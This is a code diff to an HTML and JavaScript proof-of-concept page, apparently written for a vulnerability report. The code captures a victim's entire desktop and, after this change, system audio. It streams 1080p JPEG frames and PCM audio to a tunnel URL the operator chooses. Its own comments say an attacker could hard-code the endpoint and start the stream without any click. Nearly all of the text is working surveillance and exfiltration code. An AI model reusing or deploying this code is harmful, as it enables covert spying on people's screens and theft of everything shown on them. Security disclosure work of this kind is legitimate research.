@@ -24,6 +24,9 @@
     .lab { padding: 10px; border: 2px solid #f59e0b; background: #3a260b; color: #fff2c7; font: 13px ui-monospace,monospace }
     label { display: block; margin-top: 14px; color: #cbd5e1; font-size: 13px }
     input { width: 100%; margin-top: 6px; padding: 10px; background: #111827; color: white; border: 1px solid #64748b; font: 13px ui-monospace,monospace }
+    .options { display: grid; grid-template-columns: 1fr 1fr; gap: 8px }
+    .check { display: flex; align-items: center; gap: 8px; padding: 10px 0; font-weight: 700 }
+    .check input { width: auto; margin: 0 }
     .buttons { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 12px }
     button { padding: 11px; border: 0; color: white; font-weight: 800 }
     #start { background: #15803d } #stop { background: #b91c1c }
@@ -51,10 +54,26 @@
   </section>
   <aside>
     <h2>Authorized impact control</h2>
-    <div class="lab">OWNED LAB ONLY — the triager chooses the receiver and explicitly starts/stops the live 480p stream.</div>
+    <div class="lab">OWNED LAB ONLY — the triager chooses the receiver, quality and optional system audio, then explicitly starts/stops the live stream.</div>
     <label>Cloudflare tunnel base URL
       <input id="receiver" type="url" placeholder="https://random-name.trycloudflare.com" autocomplete="off">
     </label>
+    <div class="options">
+      <label>Width
+        <input id="width" type="number" min="320" max="3840" step="2" value="1920">
+      </label>
+      <label>Height
+        <input id="height" type="number" min="240" max="2160" step="2" value="1080">
+      </label>
+      <label>Frames/second
+        <input id="fps" type="number" min="1" max="10" step="1" value="4">
+      </label>
+      <label>JPEG quality
+        <input id="quality" type="number" min="0.20" max="0.95" step="0.05" value="0.65">
+      </label>
+    </div>
+    <label class="check"><input id="sendAudio" type="checkbox"> Send legacy system audio too</label>
+    <div class="lab">The URL field and Start/Stop buttons exist only for triage control. A real attacker can hard-code their endpoint and start automatically; the separate automatic PoC proves no in-Embed click is required.</div>
     <div class="buttons">
       <button id="start" type="button">Start live stream</button>
       <button id="stop" type="button" disabled>Stop</button>
@@ -62,19 +81,20 @@
     <div id="indicator" class="indicator">NOT STREAMING</div>
     <video id="preview" autoplay muted playsinline></video>
     <pre id="status">Enter the temporary receiver URL, then press Start.</pre>
-    <canvas id="canvas" width="854" height="480"></canvas>
+    <canvas id="canvas" width="1920" height="1080"></canvas>
   </aside>
 </main>
 <script>
 "use strict";
 
 const sourceId = "screen:-1:0";
-const width = 854;
-const height = 480;
-const intervalMilliseconds = 250;
-const jpegQuality = 0.55;
-const maximumFrameBytes = 2 * 1024 * 1024;
+const maximumFrameBytes = 8 * 1024 * 1024;
 const receiverInput = document.getElementById("receiver");
+const widthInput = document.getElementById("width");
+const heightInput = document.getElementById("height");
+const fpsInput = document.getElementById("fps");
+const qualityInput = document.getElementById("quality");
+const sendAudioInput = document.getElementById("sendAudio");
 const startButton = document.getElementById("start");
 const stopButton = document.getElementById("stop");
 const indicator = document.getElementById("indicator");
@@ -86,14 +106,33 @@ const context = canvas.getContext("2d", { alpha: false });
 let stream = null;
 let timer = 0;
 let activeRequest = null;
+let activeAudioRequest = null;
 let sending = false;
+let audioSending = false;
 let startedAt = 0;
 let frameEndpoint = "";
+let audioEndpoint = "";
 let viewerUrl = "";
+let width = 1920;
+let height = 1080;
+let framesPerSecond = 4;
+let intervalMilliseconds = 250;
+let jpegQuality = 0.65;
+let audioRequested = false;
 let framesSent = 0;
 let framesSkipped = 0;
 let bytesSent = 0;
 let lastFrameBytes = 0;
+let audioChunksSent = 0;
+let audioChunksSkipped = 0;
+let audioBytesSent = 0;
+let audioSequence = 0;
+let audioContext = null;
+let audioSource = null;
+let audioProcessor = null;
+let audioGain = null;
+let pendingAudio = [];
+let pendingAudioSamples = 0;
 let lastError = null;
 
 function show(extra = {}) {
@@ -101,16 +140,30 @@ function show(extra = {}) {
     outcome: stream ? "authorized-live-screen-stream-active" : "not-streaming",
     sourceId,
     resolution: `${width}x${height}`,
-    targetFramesPerSecond: 1000 / intervalMilliseconds,
+    targetFramesPerSecond: framesPerSecond,
+    jpegQuality,
+    systemAudioRequested: audioRequested,
     framesSent,
     framesSkipped,
     bytesSent,
     lastFrameBytes,
+    audioChunksSent,
+    audioChunksSkipped,
+    audioBytesSent,
+    audioSampleRate: audioContext ? audioContext.sampleRate : null,
     elapsedSeconds: startedAt ? Math.round((Date.now() - startedAt) / 100) / 10 : 0,
     viewerUrl: viewerUrl || null,
     lastError,
     ...extra
   }, null, 2);
+}
+
+function numericOption(input, minimum, maximum, name) {
+  const value = Number(input.value);
+  if (!Number.isFinite(value) || value < minimum || value > maximum) {
+    throw new Error(`${name} must be between ${minimum} and ${maximum}`);
+  }
+  return value;
 }
 
 function validateReceiver(raw) {
@@ -136,7 +189,7 @@ async function sendFrame() {
     context.drawImage(preview, 0, 0, width, height);
     const blob = await canvasBlob();
     if (!blob) throw new Error("JPEG encoder returned no frame");
-    if (blob.size > maximumFrameBytes) throw new Error("JPEG frame exceeded 2 MiB");
+    if (blob.size > maximumFrameBytes) throw new Error("JPEG frame exceeded 8 MiB");
     activeRequest = new AbortController();
     const response = await fetch(frameEndpoint, {
       method: "POST",
@@ -165,10 +218,103 @@ async function sendFrame() {
   }
 }
 
+async function sendAudioChunk(samples, sampleRate) {
+  if (!stream || audioSending || !samples.length) {
+    audioChunksSkipped++;
+    return;
+  }
+  audioSending = true;
+  const buffer = new ArrayBuffer(samples.length * 2);
+  const view = new DataView(buffer);
+  for (let index = 0; index < samples.length; index++) {
+    const value = Math.max(-1, Math.min(1, samples[index]));
+    view.setInt16(index * 2, value < 0 ? value * 32768 : value * 32767, true);
+  }
+  try {
+    activeAudioRequest = new AbortController();
+    const sequence = ++audioSequence;
+    const response = await fetch(audioEndpoint, {
+      method: "POST",
+      mode: "cors",
+      credentials: "omit",
+      redirect: "error",
+      referrerPolicy: "no-referrer",
+      headers: {
+        "Content-Type": "application/octet-stream",
+        "X-Sample-Rate": String(sampleRate),
+        "X-Audio-Sequence": String(sequence)
+      },
+      body: buffer,
+      signal: activeAudioRequest.signal
+    });
+    if (!response.ok) throw new Error(`audio receiver returned HTTP ${response.status}`);
+    audioChunksSent++;
+    audioBytesSent += buffer.byteLength;
+    lastError = null;
+    show();
+  } catch (error) {
+    if (error.name !== "AbortError") {
+      lastError = `${error.name}: ${error.message}`;
+      show();
+    }
+  } finally {
+    activeAudioRequest = null;
+    audioSending = false;
+  }
+}
+
+async function startAudioRelay(audioTrack) {
+  audioContext = new AudioContext();
+  await audioContext.resume();
+  audioSource = audioContext.createMediaStreamSource(new MediaStream([audioTrack]));
+  audioProcessor = audioContext.createScriptProcessor(4096, 1, 1);
+  audioGain = audioContext.createGain();
+  audioGain.gain.value = 0;
+  audioSource.connect(audioProcessor);
+  audioProcessor.connect(audioGain);
+  audioGain.connect(audioContext.destination);
+  audioProcessor.onaudioprocess = event => {
+    if (!stream) return;
+    const copy = new Float32Array(event.inputBuffer.getChannelData(0));
+    pendingAudio.push(copy);
+    pendingAudioSamples += copy.length;
+    if (pendingAudioSamples < 16384) return;
+    if (audioSending) {
+      if (pendingAudioSamples > 32768) {
+        pendingAudio = [];
+        pendingAudioSamples = 0;
+        audioChunksSkipped++;
+      }
+      return;
+    }
+    const combined = new Float32Array(pendingAudioSamples);
+    let offset = 0;
+    for (const part of pendingAudio) {
+      combined.set(part, offset);
+      offset += part.length;
+    }
+    pendingAudio = [];
+    pendingAudioSamples = 0;
+    void sendAudioChunk(combined, audioContext.sampleRate);
+  };
+}
+
 function stopStream(reason) {
   clearInterval(timer);
   timer = 0;
   if (activeRequest) activeRequest.abort();
+  if (activeAudioRequest) activeAudioRequest.abort();
+  if (audioProcessor) audioProcessor.onaudioprocess = null;
+  try { if (audioSource) audioSource.disconnect(); } catch (_) {}
+  try { if (audioProcessor) audioProcessor.disconnect(); } catch (_) {}
+  try { if (audioGain) audioGain.disconnect(); } catch (_) {}
+  if (audioContext && audioContext.state !== "closed") void audioContext.close();
+  audioContext = null;
+  audioSource = null;
+  audioProcessor = null;
+  audioGain = null;
+  pendingAudio = [];
+  pendingAudioSamples = 0;
   if (stream) for (const track of stream.getTracks()) track.stop();
   stream = null;
   preview.srcObject = null;
@@ -184,7 +330,16 @@ async function startStream() {
   lastError = null;
   try {
     const base = validateReceiver(receiverInput.value);
+    width = Math.round(numericOption(widthInput, 320, 3840, "Width"));
+    height = Math.round(numericOption(heightInput, 240, 2160, "Height"));
+    framesPerSecond = Math.round(numericOption(fpsInput, 1, 10, "Frames/second"));
+    jpegQuality = numericOption(qualityInput, 0.2, 0.95, "JPEG quality");
+    intervalMilliseconds = Math.round(1000 / framesPerSecond);
+    audioRequested = sendAudioInput.checked;
+    canvas.width = width;
+    canvas.height = height;
     frameEndpoint = new URL("/frame", base).href;
+    audioEndpoint = new URL("/audio", base).href;
     viewerUrl = new URL("/viewer", base).href;
     const activationBeforeRequest = {
       isActive: navigator.userActivation ? navigator.userActivation.isActive : "unavailable",
@@ -192,34 +347,47 @@ async function startStream() {
     };
 
     stream = await navigator.mediaDevices.getUserMedia({
-      audio: false,
+      audio: audioRequested ? {
+        mandatory: { chromeMediaSource: "desktop" }
+      } : false,
       video: {
         mandatory: {
           chromeMediaSource: "desktop",
           chromeMediaSourceId: sourceId,
-          maxWidth: 1280,
-          maxHeight: 720,
-          maxFrameRate: 5
+          maxWidth: width,
+          maxHeight: height,
+          maxFrameRate: Math.max(5, framesPerSecond)
         }
       }
     });
     const track = stream.getVideoTracks()[0];
     if (!track) throw new Error("No desktop video track returned");
+    const audioTrack = stream.getAudioTracks()[0] || null;
+    if (audioRequested && !audioTrack) throw new Error("System audio was requested but no audio track returned");
     preview.srcObject = stream;
     await preview.play();
     framesSent = 0;
     framesSkipped = 0;
     bytesSent = 0;
     lastFrameBytes = 0;
+    audioChunksSent = 0;
+    audioChunksSkipped = 0;
+    audioBytesSent = 0;
+    audioSequence = 0;
     startedAt = Date.now();
-    indicator.textContent = "LIVE — STREAMING 480p TO OWNED RECEIVER";
+    indicator.textContent = `LIVE — STREAMING ${width}x${height} TO OWNED RECEIVER`;
     indicator.classList.add("live");
     stopButton.disabled = false;
     show({
       activationBeforeRequest,
       trackLabel: track.label,
-      trackSettings: track.getSettings()
+      trackSettings: track.getSettings(),
+      audioTrackLabel: audioTrack ? audioTrack.label : null,
+      audioTrackSettings: audioTrack ? audioTrack.getSettings() : null,
+      controlPanelIsTriageOnly: true,
+      attackerCanHardCodeEndpointAndAutoStart: true
     });
+    if (audioTrack) await startAudioRelay(audioTrack);
     await sendFrame();
     timer = setInterval(sendFrame, intervalMilliseconds);
   } catch (error) {
